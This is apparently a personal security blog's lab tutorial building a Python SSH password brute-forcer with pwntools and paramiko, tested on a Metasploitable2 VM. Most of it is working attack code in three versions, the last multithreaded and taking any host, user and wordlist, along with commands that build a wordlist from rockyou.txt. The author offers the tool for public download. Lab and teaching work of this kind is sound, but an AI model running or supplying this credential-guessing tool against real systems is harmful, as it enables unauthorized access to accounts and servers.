---
title: "Learning Python: SSH Bruteforcing"
description: A lab creating a simple SSH bruteforce tool and testing it against a target
date: 2024-12-05 00:00:00 +0000
categories: [Learning Topics, Python]
tags: [Python, SSH, brute force, lab, pentest]
pin: true
math: true
mermaid: true
comments: true
media_subpath: /images/PythonSSHBrute
img_path: /images/PythonSSHBrute
image:
  path: Designer.jpeg
---

 Python has many useful libraries and modules that can be useful to a penetration tester, or any security professional. Knowing programming languages is a valuable skill in the field of cybersecurity, and Python is a great language to start with. In this lab, we will create a simple Python program to brute force SSH logins against a target server. We will use the Metasploitable2 server as our target, which is a vulnerable virtual machine designed for penetration testing.

<!-- markdownlint-capture -->
<!-- markdownlint-disable -->
> Objectives: Create a Python program to brute force SSH logins and test it against a target
{: .prompt-info }
<!-- markdownlint-restore -->

## Introduction: Lab Setup

`Pwntools` is a powerful Python library designed for binary exploitation, reverse engineering, and pentesting. It provides tools and utilities to interact with processes, remote services, and shellcode, making it a staple for cybersecurity professionals and enthusiasts. Be sure to have `pwntools` installed before getting started.

```shell
pip install pwntools
```

The Metasploitable2 server is a vulnerable virtual machine that is designed for penetration testing and security training. It contains many known vulnerabilities and misconfigurations that can be exploited for educational purposes. You can download it from [Rapid7](https://docs.rapid7.com/metasploit/metasploitable-2/). It will be used here to connect to and test the SSH brute force tool.

The network diagram for this lab looks like this:

![Screenshot](diagram.png)

## Creating v1.0

We'll start by going through each line of code individually to understand how the program works. Essentially, we need to ensure the program can access the libraries that it will need to run, and ensure it has a wordlist of passwords to try. We also want to see the successful login message when the correct password is found. Knowing this, we can begin:

```python
from pwn import *
import paramiko
```

These first two lines of code import pwn module and paramiko modules. These modules grant users access to a number of tools that can help us accomplish our goals: `pwn` will allow this script to interact with SSH, and `paramiko` will be used for more SSH compatibility and error handling.

```python
host = "X.X.X.X"
username = "user"
attempts = 0
```

This block will define the variables the script will use. `Host` indicates the IP that will be targeted, `username` is the user that will be bruteforced, and I am including `attempts` to keep a log of the number of passwords tried.

```python
with open("passwords.txt", "r") as password_list:
	for password in password_list:
		password = password.strip("\n")
```
Here, the password list is defined (passwords.txt is a sample and can be changed with any file).  The passwords are stripped into a plain format that can be input during authentication with SSH.

```python
    try:
          print("[{}] Attempting password: '{}'!".format(attempts, password))
```

This section of the code will print the `attempt` number in between `[]`, indicating the number of passwords that have been attempted, and it will also display which `password` is being attempted. 

```python
      response = ssh(host=host, user=username, password=password, timeout=1)
            if response.connected():
              print("[>] Valid password found: '{}'!".format(password))
              response.close()
              break
            response.close()
```

This is the main section of the code. The reponse variable is defined with ssh, which is imported from the pwn module. We give it the `host`, `user`, and `password` parameters using the global variables defined at the beginning of the script, and `timeout`in line.

If the credentials are correct and a connection is successful, the line `"[>] Valid password found: password!"` is diplayed and the connection is closed. If the password was not correct, the connection is closed, the loop is broken, and the next password in the list is attempted until the end of the wordlist.

```python
    except paramiko.ssh_exception.AuthenticationException:
          print("[X] Invalid password!")
        attempts += 1
```
The final piece of code prints when a password is incorrect and adds 1 attempt to the counter. It will also handle SSH errors and exceptions, such as when the connection fails.

The complete version of the script is below:

```python
from pwn import *
import paramiko

host = "192.168.7.94"
username = "msfadmin"
attempts = 0

with open("passwords.txt", "r") as password_list:
	for password in password_list:
		password = password.strip("\n")
		try:
			print("[{}] Attempting password: '{}'!".format(attempts, password))
			response = ssh(host=host, user=username, password=password, timeout=1)
			if response.connected():
				print("[>] Valid password found: '{}'!".format(password))
				response.close()
				break
			response.close()
		except paramiko.ssh_exception.AuthenticationException:
			print("[X] Invalid password!")
		attempts += 1
```

This is the completed program configured for the user "msfadmin" on the Metasploitable VM. The output should show each password attempted one by one, and a success or fail message for each.  We will now test to see if there are any unexpected logic or syntax errors.

### Testing v1.0

First, we will need to make a wordlist to use as a test, "passwords.txt" was used in the code. Generating a sample list:

  ```shell
  touch passwords.txt
  tail /usr/share/wordlists/rockyou.txt > passwords.txt
  echo "msfadmin" >> passwords.txt
  ```

<!-- markdownlint-capture -->
<!-- markdownlint-disable -->
> Objectives: Be sure to have the same name for the wordlist file and the one in the code. This will ensure the program runs correctly.
{: .prompt-warning }
<!-- markdownlint-restore -->

Verify the file was created and populated:

![Screenshot](picture8.png)

With the list, we can now attempt to brute force SSH on the Metasploitable VM.

![Screenshot](picture9.png)

The brute force was successful and correcttly identified the credentials for the msfadmin user. Additionally, the counter is correctly working and we can see the program working in real time.

While this does work, it is very slow and doesn't allow for user input. So let's work on improving the code for better useability. The first task will be to speed up the process. Then we can focus on adding user input to allow for specifying host, user, and wordlist.

## Improving the Code: Speeding Up the Process

Let's break down the updated program section by section.

```python
# imports
from pwn import *
import paramiko
from time import sleep
from concurrent.futures import ThreadPoolExecutor, as_completed
```

Starting with the inputs, the `pwn` and `paramiko` modules are still used to allow for SSH interaction that we need. The new imports are `from time import sleep` and `from concurrent.features ThreadPoolExecuter, as_completed`. These new modules will allow for a delay between attempts to avoid overwhelming SSH with connections, and allows for multithreading. This what the script uses to run the attempts concurrently.

```python
# variables
host = "192.168.7.94"
username = "msfadmin"
attempts = 0
found = False
max_threads = 5
retry_delay = 2
```

The `host`, `username`, and `attempts` variable will remain the same as the previous version. We add `found = False` to indicate when a valid password is found to stop attempting passwords, `max_threads` sets the number of threads to use, and `retry_delay` will add a 2 second delay to help with error checking.

```python
# test password function
def test_password(password):
    global attempts, found
    if found:
        return None
```

This is the function that will be used to test the passwords. The global argument is added for the `attempts` and `found` variables to ensure that the function can alter the variables declared at the start of the script. 

```python
    try:
        attempts += 1
        response = ssh(host=host, user=username, password=password, timeout=1)
        if response.connected():
            log.success(f"[>] Valid password: '{password}'!")
            response.close()
            found = True
            return password
        response.close()
```

The next section of the code will attempt to connect via SSH with the variables passed into it for each password in the list. If a connection is successful, the `"Valid password"` string will be printed with the correct password using `log.success`, closes the connection, and sets the `"found"` to `True`. 

```python
      except paramiko.ssh_exception.AuthenticationException:
        log.failure(f"[X] Invalid password: '{password}'")
    except (paramiko.ssh_exception.SSHException, EOFError):
        sleep(retry_delay)
    return None
```

This block is used for any error checking relating to SSH and logs invalid password attempts to display in the terminal.

```python
# reads passwords.txt
with open("passwords.txt", "r") as password_list:
    passwords = [line.strip() for line in password_list]
```

A similar method will be used for setting up the password list. The syntax is improved by performing the strip and defining the `passwords` list in one line. 

```python
# threaded password testing
with ThreadPoolExecutor(max_threads) as executor:
    futures = {executor.submit(test_password, password): password for password in passwords}
    for future in as_completed(futures):
        result = future.result()
        if result:
            break

log.info("[*] Passwordlist exhausted!")
```

This new block of code does a lot of the lifting in the upgraded version. Implementing this in the script allows up to use a max number of threads (defined earlier with `max_threads`) to run attempts concurrently. The results are retrieved and the loop is broken when the valid password is found. A final message is also displayed when the password list is exhausted.

The updated version of the script is below:

```python
from pwn import *
import paramiko
from time import sleep
from concurrent.futures import ThreadPoolExecutor, as_completed

# variables
host = "X.X.X.X"
username = "user"
attempts = 0
found = False
max_threads = 5
retry_delay = 2

# test password function
def test_password(password):
    global attempts, found
    if found:
        return None

    try:
        attempts += 1
        response = ssh(host=host, user=username, password=password, timeout=1)
        if response.connected():
            log.success(f"[>] Valid password: '{password}'!")
            response.close()
            found = True
            return password
        response.close()
    except paramiko.ssh_exception.AuthenticationException:
        log.failure(f"[X] Invalid password: '{password}'")
    except (paramiko.ssh_exception.SSHException, EOFError):
        sleep(retry_delay)
    return None

# reads passwords.txt
with open("passwords.txt", "r") as password_list:
    passwords = [line.strip() for line in password_list]

# threaded password testing
with ThreadPoolExecutor(max_threads) as executor:
    futures = {executor.submit(test_password, password): password for password in passwords}
    for future in as_completed(futures):
        result = future.result()
        if result:
            break

log.info("[*] Passwordlist exhausted!")
```

This is the completed version of the script. It is more efficient and user-friendly than the previous version. The output should show each password attempted one by one, and a success or fail message for each.  We will now test to see if there are any unexpected logic or syntax errors.

### Testing v2.0

![Screenshot](picture18.png)

The program successfully identifies the password in the wordlist, and it was much faster then the orginal program. Now we can move onto user input. 

## Improveing the Code: Adding User Input

The final version of the script will allow for user input to specify the host, username, and wordlist file. This will make the script more versatile and user-friendly. Thankfully, adding user input is very easy in this case. The only update that needs to be made is adding the input argument to the variables host, username, and wordlist_path. 

The invalid passwords message has been removed to clean the output, and additional error checking such as the wordlist not being found, is added.

```python
from pwn import *
import paramiko
from time import sleep
from concurrent.futures import ThreadPoolExecutor, as_completed

# variables with user input
host = input("[*] Enter target host (IP or domain): ")
username = input("[*] Enter username to test: ")
wordlist_path = input("[*] Enter path to password wordlist: ")

# global variables
attempts = 0
found = False
max_threads = 5
retry_delay = 2

# test password function
def test_password(password):
    global attempts, found
    if found:
        return None

    try:
        attempts += 1
        print(f"[*] [{attempts}] Connecting to {host} with password: '{password}'")
        response = ssh(host=host, user=username, password=password, timeout=1)

        if response.connected():
            found = True
            print(f"[+] [>] Valid password found: '{password}'!")
            response.close()
            return password
        response.close()
    except (paramiko.ssh_exception.AuthenticationException, paramiko.ssh_exception.SSHException, EOFError):
        pass

    return None

# new wordlist function
try:
    with open(wordlist_path, "r") as password_list:
        passwords = [line.strip() for line in password_list]
except FileNotFoundError:
    log.error(f"[!] Wordlist file not found: {wordlist_path}")
    exit(1)

# threaded password testing
with ThreadPoolExecutor(max_threads) as executor:
    futures = {executor.submit(test_password, password): password for password in passwords}
    for future in as_completed(futures):
        result = future.result()
        if result:
            break

# final message
log.info("[*] Passwordlist exhausted!")
```

![Screenshot](picture20.png){: width="972" height="589"} 

The update is successful, we can see the password was found and the program is working as expected. This code can still be improved, but it is a good starting point for a simple SSH brute force tool! Using the password to log into Metasploitable2, we can see the successful login message:

![Screenshot](picture21.png){: width="972" height="589"} 

## Conclusion

In this lab, we have succesfully created a simple SSH brute force tool in Python. We started with a basic version that was slow and inefficient, and improved it by speeding up the process and adding user input. This tool can be used to test the security of SSH logins on a target server, and can be further customized and expanded for more advanced use cases. Python[^1] is a powerful language for cybersecurity professionals, and creating tools like this can help improve your skills and understanding of security concepts. Libraries like `pwntools`[^2] and `paramiko`[^3] can help extend the functionality of Python. This tool will be available on my [GitHub](https://github.com/Z3R0-sec) anybody to use safely and responsibly.

### Useful Resources

[^1]: Source: [Python Documentation](https://docs.python.org/3/)
[^2]: Source: [pwntools](https://docs.pwntools.com/en/stable/)
[^3]: Source: [paramiko](https://docs.paramiko.org/en/stable/)